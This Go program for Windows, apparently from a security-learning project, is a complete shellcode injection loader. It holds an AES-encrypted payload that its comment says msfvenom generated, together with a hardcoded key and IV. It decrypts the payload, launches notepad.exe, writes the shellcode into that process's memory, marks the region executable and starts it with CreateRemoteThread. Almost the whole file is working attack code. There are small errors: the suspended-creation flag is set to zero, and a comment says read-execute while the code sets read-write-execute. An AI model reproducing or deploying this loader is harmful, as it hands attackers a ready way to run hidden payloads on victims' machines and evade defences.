package main

import (
	"kaldrexx/utility"
	"log"
	"runtime"
	"syscall"
	"unsafe"
)

// Direct syscalls to kernel32.dll
var (
	kernel32DLL                   = syscall.NewLazyDLL("kernel32.dll")
	kernel32DLLOpenProcess        = kernel32DLL.NewProc("OpenProcess")
	kernel32DLLVirtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
	kernel32DLLWriteProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
	kernel32DLLVirtualProtectEx   = kernel32DLL.NewProc("VirtualProtectEx")
	kernel32DLLCreateRemoteThread = kernel32DLL.NewProc("CreateRemoteThread")
)

// Constants
const (
	// CreateProcess()
	SYSCALL_CREATE_SUSPENDED = 0x00000000 // The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.
	PROCESS_ALL_ACCESS       = 0x001F0FFF // All possible access rights for a process object.
	MEM_RESERVE              = 0x00002000 // Reserves a range of the process's virtual address space without allocating any actual physical storage in memory or in the paging file on disk.
	MEM_COMMIT               = 0x00001000 // Allocates memory charges (from the overall size of memory and the paging files on disk) for the specified reserved memory pages.
)

func main() {

	// Check if the program is running in Windows
	if runtime.GOOS != "windows" {
		log.Panicf("This program is intended to run on Windows, not %s", runtime.GOOS)
		return
	}

	// malicous shellcode to be executed, generated from msfvenom. Refer to ./utility/createShellcode.sh
	maliciousShellcodeBytes := []byte{
		0xad, 0x51, 0xd2, 0x0b, 0xd9, 0xba, 0x15, 0xf5, 0xfc,
		0x19, 0x5d, 0xf9, 0x5f, 0x75, 0xc5, 0x1f, 0xd0, 0x1c, 0x90, 0x40, 0xad,
		0xa3, 0x03, 0xb6, 0xf5, 0x85, 0x2a, 0x5f, 0xbb, 0x3e, 0x5c, 0xa5, 0x92,
		0x91, 0xcc, 0x57, 0x22, 0xd2, 0xe9, 0x6a, 0xa8, 0x56, 0xf5, 0x25, 0xdf,
		0xfc, 0x4e, 0x69, 0x79, 0x61, 0xd5, 0x5c, 0x80, 0x78, 0x96, 0x19, 0xca,
		0xe0, 0x07, 0x83, 0x07, 0xed, 0x6c, 0x9a, 0xcb, 0x30, 0xb8, 0xe9, 0x3a,
		0x94, 0x0c, 0xf0, 0x58, 0x62, 0x09, 0xe5, 0xf1, 0xce, 0x37, 0x08, 0x73,
		0x7d, 0x7a, 0xdf, 0x83, 0xe8, 0xd7, 0xe8, 0x74, 0x31, 0xef, 0x75, 0x6e,
		0xe4, 0x42, 0x9f, 0xef, 0x8b, 0x0b, 0x5d, 0x85, 0x37, 0x91, 0x38, 0x45,
		0xdd, 0x5b, 0x06, 0x82, 0xb3, 0x29, 0x41, 0x1c, 0xf5, 0x98, 0x0c, 0xb4,
		0xf7, 0xa2, 0xda, 0x37, 0x82, 0x1f, 0x8a, 0xcc, 0xf6, 0xc4, 0x12, 0xa2,
		0x8d, 0xff, 0xa0, 0xc8, 0xdf, 0x13, 0xa0, 0xbd, 0x27, 0x2f, 0x0f, 0x6e,
		0xc7, 0x5e, 0x4a, 0x11, 0xab, 0x57, 0x7c, 0x34, 0xa1, 0xaf, 0xcb, 0xc2,
		0xfd, 0x04, 0x97, 0x0f, 0xc5, 0x8d, 0x2f, 0x3c, 0x75, 0xd6, 0x33, 0xa7,
		0xf0, 0x30, 0x55, 0xc3, 0x29, 0xf0, 0x9e, 0x3f, 0x3d, 0x71, 0xe7, 0xc9,
		0xc0, 0x8b, 0x6f, 0xd5, 0xa9, 0xac, 0xfc, 0xb3, 0x40, 0x74, 0xd8, 0xdc,
		0x0c, 0x3a, 0x8f, 0xc9, 0x4e, 0x2e, 0x92, 0x37, 0xc5, 0x08, 0xb6, 0x4c,
		0xa5, 0xa4, 0x27, 0xd8, 0xda, 0x37, 0x43, 0x1f, 0xc9, 0x50, 0xbe, 0x0a,
		0x12, 0xd6, 0x0a, 0xe2, 0x15, 0x52, 0x3e, 0x23, 0x01, 0x24, 0x1e, 0x73,
		0x62, 0x34, 0xb4, 0x27, 0xd1, 0x21, 0xe0, 0xd6, 0x9a, 0xe7, 0x10, 0x85,
		0x53, 0x91, 0xe1, 0xb2, 0xf0, 0xf3, 0x8c, 0x2e, 0xcc, 0xa1, 0x52, 0x3b,
		0x54, 0x0d, 0x96, 0x4d, 0x10, 0x9f, 0x3f, 0x19, 0x39, 0x28, 0x5a, 0x66,
		0xb6, 0x1e, 0x57, 0x21, 0xb4, 0x97, 0x75, 0x8f, 0xe7, 0x2f, 0xbb, 0x30,
		0x78, 0xa5, 0x12, 0xb7, 0xf3, 0xb6, 0xc5, 0x67, 0x63, 0x23, 0x82, 0x71,
		0xc2, 0xa7, 0x3a, 0x07, 0xc3, 0xbc, 0x47, 0x16, 0x04, 0x16, 0xb2, 0xce,
		0xff, 0x8d, 0xe5, 0x1c, 0xc3, 0x05, 0x1c, 0xf1, 0x47, 0x12, 0x9a, 0x64,
		0xb9, 0x2c, 0x41, 0x45, 0x6c, 0x97, 0x6e, 0x8f, 0xd1, 0x2d, 0xdc, 0x77,
		0xf1, 0xa8, 0x77, 0x21, 0x27, 0xca, 0x7b, 0xa2, 0x9b, 0xdb, 0xe4, 0xec,
		0xd3, 0xf7, 0x6a, 0x36, 0xa5, 0xfe, 0xda, 0x7b, 0xfb, 0x7f, 0xea, 0xa8,
		0x7d, 0xd4, 0x82, 0x69, 0xc6, 0x2e, 0xf0, 0xde, 0xe5, 0xa7, 0x39, 0x90,
		0x5d, 0x68, 0xd3, 0x1f, 0xb2, 0x49, 0xdc, 0x8e, 0xdc, 0x2b, 0x4e, 0x35,
		0xa5, 0x2c, 0x4c, 0xfb, 0xa2, 0x88, 0xfa, 0xb2, 0xbe, 0xd7, 0xfa, 0x83,
		0xed, 0x02, 0xe2, 0xa7, 0x9e, 0x7b, 0xbc, 0x59, 0x04, 0x12, 0xe2, 0x50,
		0x16, 0xe2, 0xe0, 0xca, 0xed, 0xc9, 0xd0, 0xb0, 0x11, 0x4e, 0xd6, 0xb5,
		0xa4, 0xf0, 0x53, 0xdd, 0x70, 0xa1, 0x43, 0x74, 0xf8, 0xba, 0x07, 0xca,
		0x45, 0x2f, 0x98, 0x21, 0x88, 0xb8, 0xa1, 0x63, 0x2e, 0xbf, 0xcc, 0x15,
		0xdd, 0x09, 0x6a, 0xe8, 0xb0, 0xa4, 0x23, 0xea, 0x2a, 0x6b, 0xd3, 0xf9,
		0x62, 0x3a, 0xe6, 0xc9, 0x85, 0xe1, 0x9c, 0x93, 0x3a, 0x00, 0xdb, 0x2c,
		0xb7, 0x3c, 0x36, 0x69, 0x80, 0x9b, 0x90, 0xaf, 0xf8, 0xe8, 0x91, 0x83,
		0x7e, 0x15, 0x5b, 0x15, 0xf2, 0x43, 0xf7, 0x3f, 0x7b, 0xac, 0x45, 0xf8,
		0x97, 0x18, 0xdf, 0x13, 0xdc, 0xc4, 0x9a, 0xf4, 0x09, 0x0c, 0xd4, 0x5d,
		0x5c, 0xb6, 0x56, 0xba, 0x43, 0x4b, 0xc8, 0x46, 0x6e, 0x4c, 0x88, 0x36,
		0x44, 0x93, 0xe7, 0xf7, 0x9d, 0xac, 0xbb, 0x69, 0x3e, 0x52, 0x32, 0x26,
		0xa9, 0xc5, 0x1c, 0x05, 0xdd, 0x6f, 0x3c, 0x29, 0x43, 0x15, 0xd7, 0xda,
		0x38, 0x06, 0x5f, 0xb0, 0xd9, 0x5f, 0xbe, 0xb1, 0x7f, 0xe0, 0x16, 0x00,
		0x1b, 0x71, 0xfa, 0x20, 0xbf, 0x6b, 0x6d, 0xbf, 0x00, 0x50, 0xf9, 0x04,
		0x93, 0xc8, 0x13, 0xa2, 0x5e, 0x5e, 0x48, 0x5c, 0x61, 0xfb, 0x0e, 0xae,
		0x4f, 0xab, 0x46, 0xaa, 0x42, 0x65, 0x80, 0xa4, 0x89, 0xf1, 0x3a, 0xe3,
		0x29, 0xe9, 0x0f, 0x38, 0x2f, 0x6a, 0xe5, 0xdf, 0x74, 0x66, 0xbf, 0xc1,
		0x43, 0x83, 0xb4, 0x96, 0xc3, 0x7c, 0x59, 0x2b, 0xac, 0xd9, 0xd6, 0xaa,
		0xcc, 0x72, 0x69, 0x7b, 0x51, 0xfc, 0xe9, 0xd3, 0xa0, 0x78, 0x04, 0xb2,
		0x47, 0x81, 0x62, 0x44, 0xfc, 0xaa, 0x4a, 0xad, 0xb7, 0xa9, 0xda, 0xe8,
		0xd5, 0xdc, 0x88, 0xf8, 0xcd, 0xcd, 0xaa, 0x80, 0xd6, 0xe0, 0xea, 0xee,
		0xed, 0x19, 0x73, 0xca, 0xc9, 0xf8, 0x19, 0x0f, 0x75, 0xb1, 0x9e, 0x78,
		0x5f, 0x7f, 0xb9, 0x2f, 0xd1, 0x38, 0x58, 0x3a, 0xbc, 0x40, 0x5d}
	log.Printf("[+] Malicious shellcode read, %d bytes\n", len(maliciousShellcodeBytes))

	// Decrypt the malicious shellcode
	// The decryption key and initial vector are stored in the .env file
	aesKey := []byte("5ea4dd3a1162c2b98636ccd4d373b31d")
	aesInitialVector := []byte("7e419d06bac1fb93")
	decryptedShellcodeBytes, err := utility.AES256Decrypt(maliciousShellcodeBytes,
		[]byte(aesKey),
		[]byte(aesInitialVector))
	if err != nil {
		log.Panicf("[-] Error decrypting the malicious shellcode: %s", err)
		return
	} else {
		log.Printf("[+] Malicious shellcode decrypted successfully, %d bytes\n", len(decryptedShellcodeBytes))
	}

	// Create the target process
	targetProcessLocation := "C:\\Windows\\System32\\notepad.exe"
	targetProcessLocationUTF16PtrFromString, err := syscall.UTF16PtrFromString(targetProcessLocation)
	if err != nil {
		log.Panicf("Error converting the target process location to a UTF-16 pointer: %s", err)
		return
	}

	var processInformation syscall.ProcessInformation
	var startupInformation syscall.StartupInfo
	startupInformation.Cb = uint32(unsafe.Sizeof(startupInformation))
	processInformation.Process = syscall.Handle(0)
	processInformation.Thread = syscall.Handle(0)
	processInformation.ProcessId = 0
	processInformation.ThreadId = 0

	if err := syscall.CreateProcess(
		nil,                                     // lpApplicationName
		targetProcessLocationUTF16PtrFromString, // lpCommandLine
		nil,                                     // lpProcessAttributes
		nil,                                     // lpThreadAttributes
		false,                                   // bInheritHandles
		SYSCALL_CREATE_SUSPENDED,                // dwCreationFlags
		nil,                                     // lpEnvironment
		nil,                                     // lpCurrentDirectory
		&startupInformation,                     // lpStartupInfo
		&processInformation,                     // lpProcessInformation
	); err != nil {
		log.Panicf("[-] Error creating the process: %s", err)
		return
	} else {
		log.Printf("[+] Target process(%s) created as PID %v\n", targetProcessLocation, processInformation.ProcessId)
	}

	// Open the target process
	targetProcessHandle, _, err := kernel32DLLOpenProcess.Call(
		PROCESS_ALL_ACCESS,                    // dwDesiredAccess
		uintptr(0),                            // bInheritHandle
		uintptr(processInformation.ProcessId)) // dwProcessId
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error opening the process: %s", err)
		return
	} else {
		log.Printf("[+] Target process(%s) handle acquired as process handle %v\n", targetProcessLocation, targetProcessHandle)
	}

	// Allocate memory in the target process
	targetProcessAllocatedMemoryPtr, _, err := kernel32DLLVirtualAllocEx.Call(
		targetProcessHandle,                   // hProcess
		uintptr(0),                            // lpAddress
		uintptr(len(decryptedShellcodeBytes)), // dwSize
		uintptr(MEM_RESERVE|MEM_COMMIT),       // flAllocationType
		uintptr(syscall.PAGE_READWRITE))       // flProtect
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error allocating memory in the process: %s", err)
		return
	} else {
		log.Printf("[+] Allocated memory in the target process at 0x%X\n", targetProcessAllocatedMemoryPtr)
	}

	// Write the shellcode to the allocated memory in the target process
	var bytesWritten uint32
	writeProcessMemoryResult, _, err := kernel32DLLWriteProcessMemory.Call(
		targetProcessHandle,                                  // hProcess
		targetProcessAllocatedMemoryPtr,                      // lpBaseAddress
		uintptr(unsafe.Pointer(&decryptedShellcodeBytes[0])), // lpBuffer
		uintptr(len(decryptedShellcodeBytes)),                // nSize
		uintptr(unsafe.Pointer(&bytesWritten)))               // lpNumberOfBytesWritten (out)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error writing the shellcode to the process: %s", err)
		return
	} else {
		log.Printf("[+] Wrote the shellcode to the allocated memory in the target process, %v, %d bytes written\n", writeProcessMemoryResult, bytesWritten)
	}

	// Modify the protection permission of the allocated memory in the target process, to RX(Read and Execute)
	var oldProtect uint32
	virtualProtectExResult, _, err := kernel32DLLVirtualProtectEx.Call(
		targetProcessHandle,                     // hProcess
		targetProcessAllocatedMemoryPtr,         // lpAddress
		uintptr(len(decryptedShellcodeBytes)),   // dwSize
		uintptr(syscall.PAGE_EXECUTE_READWRITE), // flNewProtect
		uintptr(unsafe.Pointer(&oldProtect)))    // lpflOldProtect (out)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error modifying the protection permission of the allocated memory in the process: %s", err)
		return
	} else {
		log.Printf("[+] Modified the protection permission of the allocated memory in the target process, %v\n", virtualProtectExResult)
	}

	// Create a remote thread in the target process
	createdRemoteThreadHandle, _, err := kernel32DLLCreateRemoteThread.Call(
		targetProcessHandle,             // hProcess
		uintptr(0),                      // lpThreadAttributes
		uintptr(0),                      // dwStackSize
		targetProcessAllocatedMemoryPtr, // lpStartAddress
		uintptr(0),                      // lpParameter
		uintptr(0),                      // dwCreationFlags
		uintptr(0))                      // lpThreadId (ignore)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error creating a remote thread in the process: %s", err)
		return
	} else {
		log.Printf("[+] Created a remote thread in the target process, %v\n", createdRemoteThreadHandle)
	}

}
